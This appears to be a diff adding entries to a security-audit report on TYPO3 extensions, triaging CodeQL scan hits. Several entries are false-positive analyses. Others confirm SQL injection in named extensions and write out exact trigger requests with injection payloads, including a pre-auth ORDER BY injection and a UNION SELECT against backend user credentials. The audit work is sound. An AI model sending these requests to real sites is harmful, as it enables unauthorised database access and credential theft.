@@ -624,6 +624,58 @@ No concrete pre-auth exploitable vulnerability (SQLi, XSS, object injection, pat
 
 No actionable pre-auth source→sink vulnerability identified in the audited scope for this version.
 
+### auba_cms-census
+
+#### auba_cms-census — UrlRepository.php:131 (fetchSearchResult)
+
+## Verdict: CONFIRMED pre-auth SQL injection (ORDER BY direction), anonymous frontend
+
+**Sink (line 116-131):**
+```php
+116  public function fetchSearchResult($searchData,$sort,$formate){
+118      if($searchData['domain']){
+119          $sort = $sort ? $sort : 'uid';
+120          $formate = $formate ? $formate : 'ASC';
+121          $queryBuilder = ...->getQueryBuilderForTable('tx_cmscensus_domain_model_url');
+122          $queryBuilder->select('*')->from(...)
+125              ->where($queryBuilder->expr()->like('name',
+128                  $queryBuilder->createNamedParameter($queryBuilder->escapeLikeWildcards($searchData['domain']).'%')))
+131              ->addOrderBy((string)$sort, $formate);   // <-- $formate = ORDER BY direction, unsanitized
+```
+
+`QueryBuilder::addOrderBy($fieldName, $order)` in TYPO3 v11 quotes the **field name** (`$sort`) via `quoteIdentifier()`, but passes the **direction** (`$order` = `$formate`) straight through to Doctrine's concrete query builder, which concatenates it as `` `field` <direction> ``. The direction string is never validated or quoted → arbitrary SQL can be injected into the ORDER BY clause through `$formate`.
+
+## Tainted chain (request → sink)
+```
+ChartController.php:85  $searchData = GeneralUtility::_GP('tx_cmscensus_chartcmscensus');
+ChartController.php:86  $sortBy     = GeneralUtility::_GP('sortby');     // -> $sort (field, quoted -> safe)
+ChartController.php:87  $sort       = GeneralUtility::_GP('formate');    // -> $formate (direction, INJECTABLE)
+ChartController.php:88  if($searchData['domain']) {
+ChartController.php:91      $this->urlRepository->fetchSearchResult($searchData, $sortBy, $sort);
+UrlRepository.php:120       $formate = $formate ? $formate : 'ASC';
+UrlRepository.php:131       ->addOrderBy((string)$sort, $formate);
+```
+The lines 89-90 (`$sort=='null' ? ... : $sortBy;`) are effectively no-ops (results discarded / typo), so the raw `formate` GET value survives unless it is literally the string `null`.
+
+## Reachability / auth
+**Anonymous frontend.** `ext_localconf.php` registers the FE plugin via
+`ExtensionUtility::configurePlugin('CmsCensus','Chartcmscensus', [ChartController::class => 'show, search'], ...)` and `search` is listed as a non-cacheable frontend action. Any public page holding the `cmscensus_chartcmscensus` content element exposes `searchAction` to unauthenticated visitors. No FE-user or BE-user check. Pre-auth.
+
+## Exact request to trigger
+On a page (uid `<PID>`) that contains the Chartcmscensus plugin:
+```
+GET /index.php?id=<PID>
+    &tx_cmscensus_chartcmscensus[action]=search
+    &tx_cmscensus_chartcmscensus[controller]=Chart
+    &tx_cmscensus_chartcmscensus[domain]=x
+    &sortby=uid
+    &formate=ASC,(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)
+```
+`sortby`/`formate` are top-level (non-namespaced) GET params read by `_GP()`. `tx_cmscensus_chartcmscensus[domain]` must be non-empty to enter the vulnerable branch. The `formate` value is injected verbatim after the quoted `` `uid` `` in the ORDER BY clause, enabling error/boolean/time-based blind extraction.
+
+## Version
+`version => 1.1.1`, depends `typo3 11.5.0-11.5.99` (Doctrine QueryBuilder).
+
 ### azich_direct-mail
 
 #### Security Audit — `azich/direct-mail` (v6.0.0-dev)
@@ -3339,6 +3391,77 @@ Content-Disposition: form-data; name="file"; filename="x"
 Stored filename becomes `.._.._.._.._var_www_html_shell.php` inside the configured upload dir
 (no traversal); and `checkFileExtension` rejects `.php` via fileDenyPattern before any write.
 
+### friendsoftypo3_rtehtmlarea
+
+#### friendsoftypo3_rtehtmlarea — SpellCheckingController command injection
+
+**Verdict: FALSE POSITIVE (command injection).**
+Every request-derived value on the aspell command line is wrapped in `escapeshellarg()`; the aspell binary path is admin-only configuration, not request input. Additionally the endpoint is a **backend-authenticated** AJAX route (not pre-auth), and the line-299 sink is further gated on a valid `BE_USER`.
+
+## Sinks
+
+`Classes/Controller/SpellCheckingController.php`
+
+### Line 299 — `shell_exec($aspellCommand)` (the `cmd === 'learn'` branch)
+
+Command assembled at lines 292-298:
+
+```php
+$aspellCommand = ((TYPO3_OS === 'WIN') ? 'type ' : 'cat ') . escapeshellarg($tmpFileName) . ' | '
+    . $this->AspellDirectory                                              // admin config, not request
+    . ' -a --mode=none'
+    . ($this->personalDictionaryPath ? ' --home-dir=' . escapeshellarg($this->personalDictionaryPath) : '')
+    . ' --lang='     . escapeshellarg($this->dictionary)
+    . ' --encoding=' . escapeshellarg($mainDictionaryCharacterSet)
+    . ' 2>&1';
+```
+
+Every interpolated value is escaped:
+- `$tmpFileName` — server-generated (`GeneralUtility::tempnam`), `escapeshellarg`.
+- `$this->personalDictionaryPath` — derived from BE user uid / FAL folder, `escapeshellarg`.
+- `$this->dictionary` — from `_POST('dictionary')` (`:210`) but **validated against the aspell dict allow-list** (`:214`, falls back to `'en'`) **and** `escapeshellarg`'d.
+- `$mainDictionaryCharacterSet` — read from a dictionary `.dat` file, `escapeshellarg`.
+- `$this->AspellDirectory` — `$GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['rtehtmlarea']['plugins']['SpellChecker']['AspellDirectory']` (`:188`), an **instance-admin config value**, defaulting to `/usr/bin/aspell`. Not reachable from the HTTP request.
+
+No unescaped request-controlled data enters the command line. No injection.
+
+### Line 393 — `shell_exec($aspellCommand)` in `setMainDictionaryPath()`
+
+```php
+$aspellCommand = $this->AspellDirectory . ' config dict-dir';   // :392
+$aspellResult = shell_exec($aspellCommand);                     // :393
+```
+
+Composed solely from `$this->AspellDirectory` (admin config) plus a constant string. Zero request input. Not injectable.
+
+(The other `shell_exec`s — `:192`, `:197`, `:200`, and `:643` in `spellCheckHandler` — are the same story: only `$this->AspellDirectory` config plus `escapeshellarg`'d user parts.)
+
+## Backward trace / sanitizers
+
+- `dictionary`: `GeneralUtility::_POST('dictionary')` (`:210`) -> allow-list check `in_array($this->dictionary, $dictionaryArray)` (`:214`) -> `escapeshellarg` (`:296`, `:640`). Killed twice over.
+- `pspell_mode`, `pspell_charset`, `content`, `editorId`, `restrictToDictionaries`, `to_p_dict`, `to_r_list`: none reach a shell argument unescaped (`pspellMode` is `escapeshellarg`'d at `:638`; `content` goes only to the XML parser; `editorId` goes only to `quoteJSvalue` HTML output).
+- aspell path: config, not request-derived.
+
+`escapeshellarg` on the language/encoding/path + fixed aspell binary from admin config = command injection not reachable.
+
+## Reachability / auth — CRUCIAL
+
+- Registered in `Configuration/Backend/AjaxRoutes.php:13-16` as backend AJAX route `rtehtmlarea_spellchecker`, path `/rte/spellchecker`, target `SpellCheckingController::processRequest`.
+- **No `access => public`** on the route -> TYPO3 backend RouteDispatcher requires a valid `be_user` session. **This is a backend-only, authenticated endpoint — NOT pre-auth.** The RTE itself only runs in the backend.
+- The line-299 `learn` branch adds a second gate: `if (TYPO3_MODE !== 'BE' || !is_object($GLOBALS['BE_USER'])) { die(''); }` (`:259-261`).
+
+Even for an authenticated backend user there is no command injection (all args escaped). A backend-only route also means this is not pre-auth by any path.
+
+## Version
+
+`ext_emconf.php`: **rtehtmlarea 8.7.4**, `state = obsolete`.
+Constraints: TYPO3 `8.7.0-8.7.99`.
+(Note: `ext_emconf` namespace is `TYPO3\CMS\Rtehtmlarea` — the former core RTE extracted to friendsoftypo3.)
+
+## Conclusion
+
+FALSE POSITIVE for command injection at both `:299` and `:393`. The historical `aspell` shell-out is present, but the language/dictionary/encoding/path arguments are `escapeshellarg`-escaped and the aspell executable path comes from server admin configuration rather than the request. Not exploitable, and in any case only reachable behind a backend session.
+
 ### friendsoftypo3_tt-address
 
 #### Security Audit — friendsoftypo3/tt_address
@@ -4772,6 +4895,46 @@ Genuine SQL injection (ORDER BY direction/field, plus table/column identifier
 injection in `RecordRepository`), **authenticated backend only**. Not a
 pre-auth / frontend-reachable SQLi.
 
+### labor-digital_typo3-frontend-api
+
+#### labor-digital_typo3-frontend-api (T3FA) — TransformationSchema.php:119
+
+## Verdict: FALSE POSITIVE (callable identity is reflection/config-sourced, not request-controlled)
+
+**Sink (line 119):** `return $value->$method();` — a dynamic method call.
+
+```php
+110  public function getValue(object $value, string $property)
+111  {
+112      if (! isset($this->properties[$property])) return null;
+116      if ($this->properties[$property][0] === AbstractReflector::PROPERTY_ACCESS_GETTER) {
+117          $method = $this->properties[$property][1];
+119          return $value->$method();
+```
+
+`$method` is the callable identity. It comes from `$this->properties[$property][1]`, and `$this->properties` is populated exclusively by the schema reflectors, not by the request:
+
+`Reflection/AbstractReflector.php:76-91`
+```php
+foreach ($ref->getMethods(ReflectionMethod::IS_PUBLIC) as $method) {
+    $methodName = $method->getName();               // from PHP reflection of the class
+    if (str_starts_with(..., 'is'|'has'|'get')) {
+        if ($method->getNumberOfRequiredParameters() !== 0) continue;
+        $properties[Inflector::toProperty($methodName)] = [PROPERTY_ACCESS_GETTER, $methodName];
+    }
+}
+```
+
+So `$method` can only ever be the name of an **existing zero-argument public getter (`get*`/`is*`/`has*`) of the object being transformed** (`$value`), discovered by `ReflectionClass` over the server-side domain model. The request never supplies the method name.
+
+Even the `$property` key selecting which getter to call is `array_keys($this->properties)` filtered by an allow/deny list (`getAllowedProperties()` / `getAttributes()`), i.e. still bounded to the reflected getter set — and no arguments are passed to the call. Request input controls neither the callable identity nor its arguments. This is ordinary getter dispatch, not code injection.
+
+## Reachability / auth
+The transformer does run on anonymous frontend API requests (this is a headless/SPA API extension). That satisfies pre-auth reachability, but the operation reached is a safe, bounded getter call, so reachability does not create a vulnerability.
+
+## Version
+`version => 10.8.4`, depends `typo3 10.0.0-10.99.99`, `t3ba 10.0.0-10.99.99`.
+
 ### lochmueller_fl_realurl_image
 
 #### Target C — lochmueller_fl_realurl_image — `RealUrlImage.php:110`
@@ -5014,6 +5177,48 @@ Attempting `sort=uid;DROP...` or `order=asc--` is discarded by the whitelist/nor
 ## Bottom line
 Pre-auth reachable but not exploitable. The ORDER BY concatenation is guarded by a strict column whitelist and a DESC/ASC normalizer; all other inputs are int-cast and bound via `createNamedParameter`. **No SQL injection.**
 
+### mia3_mia3_categories
+
+#### mia3_mia3_categories — CategoryController.php:48 (indexAction)
+
+## Verdict: CONFIRMED SQL injection — auth-required (authenticated backend user)
+
+**Sink (line 45-51):**
+```php
+40  public function indexAction() {
+41      $where = '1=!';
+42      if (isset($_GET['id'])) {
+43          $where = 'pid = ' . $_GET['id'];        // <-- raw concatenation, no intval/quote
+44      }
+45      $categories = $GLOBALS['TYPO3_DB']->exec_SELECTgetRows(
+46          '*',
+47          'sys_category',
+48          $where . ' AND deleted = 0' . BackendUtility::BEenableFields('sys_category'),
+49          '', 'sorting'
+50      );
+```
+
+`$_GET['id']` is concatenated directly into the WHERE clause of a raw `exec_SELECTgetRows()`. No `intval()`, no `quote()`, no `createNamedParameter()`. Classic SQL injection.
+
+## Tainted chain
+`$_GET['id']` (CategoryController.php:42-43) → `$where` → `exec_SELECTgetRows(..., $where ...)` (CategoryController.php:45-48).
+
+## Reachability / auth
+**Backend module only.** `ext_tables.php` registers it via `ExtensionUtility::registerModule('Mia3....', 'web', 'txmia3categoriesmod1', ..., ['Category' => 'index,updateSorting,batchCreate'], ['access' => 'user,group'])` and the whole block is guarded by `TYPO3_MODE === 'BE'`. There is **no** `configurePlugin` / FE plugin / eID registration. The controller also assigns `$_GET['moduleToken']` to the view, confirming backend-module context. Reaching `indexAction` therefore requires an authenticated **backend user** with access to the module (`access => user,group`).
+
+Not pre-auth. This is an authenticated-backend-user SQL injection (privilege-escalation / data-exfil primitive for any BE user who has the module, including non-admin editors).
+
+## Exact request (authenticated BE session)
+```
+GET /typo3/index.php?route=/module/web/Mia3Mia3categoriesTxmia3categoriesmod1
+    &tx_mia3categories_web_mia3mia3categoriestxmia3categoriesmod1[controller]=Category
+    &id=0) UNION SELECT ... -- -
+```
+i.e. supply `&id=<SQL>` (e.g. `id=1 AND (SELECT ...)` or `id=0) UNION SELECT username,password,... FROM be_users-- -`) while logged into the backend module.
+
+## Version
+`version => 0.0.0`, `state => alpha`. Uses legacy `$GLOBALS['TYPO3_DB']` (TYPO3 6/7-era API).
+
 ### oliverklee_realty
 
 #### Security Audit — oliverklee/realty (Realty Manager) v3.0.2
@@ -5118,6 +5323,75 @@ The `assert()` calls receive boolean expressions, so even with `zend.assertions`
 ## Version
 Seminar Manager **6.0.x-dev**, TYPO3 `11.5.41–12.4.99`, PHP `7.4–8.4`.
 
+### pagemachine_ats
+
+#### pagemachine_ats — AjaxApplicationRepository SQL injection
+
+**Verdict: CONFIRMED — auth-required (backend user) SQL injection in ORDER BY. NOT pre-auth.**
+The CodeQL "anonymous applicant" hypothesis is **refuted**: this repository is reachable only through a backend-module AJAX route, never from the anonymous frontend applicant flow.
+
+## Sink
+
+`Classes/Domain/Repository/AjaxApplicationRepository.php`, method `findWithQuery()`:
+
+```php
+->setFirstResult( $query->getOffset() )        // line 88
+->setMaxResults( $query->getLimit() )          // line 91
+->orderBy(
+    $query->getOrderBy(),                      // line 94  <-- raw string identifier
+    $query->getOrderDirection()                // line 95  <-- raw string direction
+);
+```
+
+- **Lines 88 / 91 (offset / limit): not exploitable.** `offset` and `limit` are `(int)`-cast in the `ApplicationQuery` constructor (`ApplicationQuery.php:259-260`), and `setFirstResult`/`setMaxResults` emit integer LIMIT/OFFSET. False alarms.
+- **Lines 94 / 95 (orderBy field + direction): the real injection.** Both are plain strings copied verbatim from request input with no cast, no allow-list, no `createNamedParameter`. TYPO3 `QueryBuilder::orderBy()` `quoteIdentifier`s only the field name; the **sort direction is concatenated into the SQL raw**, and the field name is not validated against a column allow-list. Attacker-controlled SQL fragment reaches the ORDER BY clause.
+
+The parameterized constraints in `buildQueryConstraints()` (lines 108-133, all `createNamedParameter`) are safe and are not the issue.
+
+## Tainted chain (request -> sink)
+
+1. Backend AJAX route `ats_applications_list` -> `AjaxApplicationController::getApplications`
+   `Configuration/Backend/AjaxRoutes.php:4-6`
+2. `$body = $request->getParsedBody();` -> `new ApplicationQuery($body['query'])`
+   `Classes/Controller/Backend/AjaxApplicationController.php:21,23`
+3. `ApplicationQuery::__construct()` copies input **unsanitized**:
+   `$this->orderBy = $queryParams['orderBy'] ?: $this->orderBy;`  `ApplicationQuery.php:257`
+   `$this->orderDirection = $queryParams['orderDirection'] ?: $this->orderDirection;`  `ApplicationQuery.php:258`
+4. `getApplications` calls `$repository->findWithQuery($query)`
+   `AjaxApplicationController.php:30`
+5. `findWithQuery()` -> `->orderBy($query->getOrderBy(), $query->getOrderDirection())`
+   `AjaxApplicationRepository.php:93-96` (sink lines 94, 95)
+
+No sanitizer anywhere on `orderBy` / `orderDirection` between request and sink.
+
+## Reachability / auth — CRUCIAL
+
+- The **only** caller of `AjaxApplicationRepository` is `Controller/Backend/AjaxApplicationController` (verified: no other reference; the repo's own comments say "called in BE context" and it reads `$GLOBALS['BE_USER']`).
+- The **only** input-fed `new ApplicationQuery($body['query'])` is that backend controller. The other instantiations use defaults or `$GLOBALS['BE_USER']->uc` session data (`ApplicationController.php:156`, `ApplicationQuery::buildFromSession`).
+- Route is `Configuration/Backend/AjaxRoutes.php` (a **backend** AJAX route), path `/ats/applications`, with **no `access => public`** key -> the TYPO3 backend RouteDispatcher requires a valid `be_user` session and route token. **Authenticated backend endpoint, not pre-auth.**
+- There is **no** eID / frontend plugin / anonymous applicant path into this repository. The public applicant flow (`Classes/Controller/Application/*`) does not touch `AjaxApplicationRepository`.
+
+So: exploitable, but only by an authenticated backend user (any BE user who can reach the applications list module). A low-privilege editor with backend access is enough — it is a privilege/data-integrity issue, not a pre-auth RCE-adjacent SQLi.
+
+## Exact request to trigger
+
+Authenticated backend user, POST to the backend AJAX endpoint:
+
+```
+POST /typo3/index.php?route=/ats/applications&token=<valid-route-token> HTTP/1.1
+Cookie: be_typo_user=<valid BE session>
+Content-Type: application/x-www-form-urlencoded
+
+draw=1&query[orderDirection]=<SQL>&query[orderBy]=application.uid
+```
+
+`query[orderDirection]` (and/or `query[orderBy]`) carries the injected SQL that lands in the ORDER BY clause. Example payload for the direction: `ASC, (SELECT ... )` style sub-select / stacked expression exfiltration via ordering.
+
+## Version
+
+`ext_emconf.php`: **pagemachine_ats 2.0.1**, `state = stable`.
+Constraints: PHP `7.2.0-7.4.99`, TYPO3 `9.5.0-9.5.99`, static_info_tables `6.7.0-6.99.99`.
+
 ### phorax_formhandler
 
 #### Security Audit — `phorax/formhandler` (TYPO3 Formhandler)
@@ -5202,6 +5476,41 @@ The **one concrete, pre-auth, high-impact finding is an unrestricted file upload
 ## Known CVEs / advisories
 
 No TYPO3 Security-Team advisory (`TYPO3-EXT-SA-*`) or CVE is on record for `phorax/formhandler` or the original `typoheads/formhandler` covering this code. The unrestricted-upload behaviour (F1) matches the long-standing, documented Formhandler guidance that integrators must lock down the upload folder and set `allowedTypes` — i.e. it is an **insecure-by-default** condition shipped in this version, not a fix that was applied and later regressed. Treat F1 as the actionable, unpatched pre-auth issue.
+
+### phorax_loginusertrack
+
+#### phorax_loginusertrack — LoginusertrackController.php:589
+
+## Verdict: FALSE POSITIVE (sink is whitelisted; module is backend-only regardless)
+
+**Sink (line 589):** `$res = $GLOBALS['TYPO3_DB']->sql_query($query);` inside `showActive()`.
+
+The only request-derived value that reaches this `$query` is the ORDER BY column:
+
+```php
+581  $orderBy = GeneralUtility::_GP('orderby');
+582  $query = 'SELECT ... FROM fe_users WHERE pid=' . intval($id) .
+583      ' AND lastlogin > ' . (time() - $daysBack * 24 * 3600) .
+...
+587      ' ORDER BY ' . (GeneralUtility::inList('username,name,email,lastlogin',
+588          $orderBy) ? $orderBy . ($orderBy == 'lastlogin' ? ' DESC' : '') : 'name');
+589  $res = $GLOBALS['TYPO3_DB']->sql_query($query);
+```
+
+- `orderby` (_GP) is gated by `GeneralUtility::inList('username,name,email,lastlogin', $orderBy)` — a strict whitelist. A non-matching value falls back to the literal `name`. Not injectable.
+- `$id` is `intval()`'d (from `$this->id`, page id).
+- `$daysBack` is `MathUtility::forceIntegerInRange(...)` (line 402).
+
+No tainted value survives to the sink at line 589.
+
+## Reachability / auth
+Backend-only. The class extends `\TYPO3\CMS\Backend\Module\BaseScriptClass`, module `web_txloginusertrackM1`, dispatched via `mainAction()` behind `main()`'s `BackendUtility::readPageAccess()` + `$GLOBALS['BE_USER']` checks. A valid, authenticated **backend user** is required to reach any code path here. No FE plugin / eID registration exists.
+
+## Note (not the target line, still backend-auth-gated)
+`removeOld()` line 459 builds `... AND username="' . addslashes($testUsername) . '"'` from `_GP('test_username')`. `addslashes` inside a double-quoted SQL string is weak, but this is a different line, only reachable by an authenticated backend user with page access, so it is not a pre-auth issue and out of scope for the reported sink.
+
+## Version
+`version => 3.0.0`, `TYPO3_version => 7.6.0-8.7.999` (uses legacy `$GLOBALS['TYPO3_DB']`).
 
 ### phorax_mydashboard
 
@@ -5882,7 +6191,7 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 
 ## CodeQL mass-scan candidates (intra-extension, all 3350 exts)
 ```
-# 1157 raw -> 926 after noise filter
+# 1208 raw -> 962 after noise filter
 
 [CRIT] Code injection       erecht24_er24-rechtstexte    Classes/Controller/AjaxController.php:131
 [CRIT] Code injection       pixelant_pxa-pm-importer     Classes/Controller/Ajax/ProgressBarController.php:42
@@ -5901,6 +6210,8 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 [CRIT] SQL injection        pagemachine_ats              Classes/Domain/Repository/AjaxApplicationRepository.php:95
 [CRIT] Code injection       site_site-core               Classes/Http/Middleware/AjaxMiddleware.php:84
 [CRIT] Server-side request  skynettechnologies_typo3-all Classes/Middleware/AwesomeMiddleware.php:33
+[XSS ] Reflected XSS        ubl_supportchat              Classes/Controller/AjaxFrontendController.php:207
+[CRIT] SQL injection        visol_solrmultilangresults   Classes/Eid/SearchResultsEid.php:99
 [CRIT] Code injection       blueways_bw-bookingmanager   Classes/Controller/Backend/EntryListModuleController.php:30
 [CRIT] Command injection    friendsoftypo3_rtehtmlarea   Classes/Controller/SpellCheckingController.php:299
 [CRIT] Command injection    friendsoftypo3_rtehtmlarea   Classes/Controller/SpellCheckingController.php:393
@@ -5922,6 +6233,4 @@ is compared against the affected range of publicly known TYPO3 Security Advisori
 [CRIT] SQL injection        mia3_mia3_categories         Classes/Controller/CategoryController.php:48
 [CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:207
 [CRIT] Server-side request  mittwald_typo3_forum         Classes/Controller/AbstractController.php:211
-[CRIT] SQL injection        netresearch_nr-vault         Classes/Controller/AuditController.php:95
-[CRIT] Code injection       oktopuce_site-generator      Classes/Controller/SiteGeneratorController.php:181
 ```
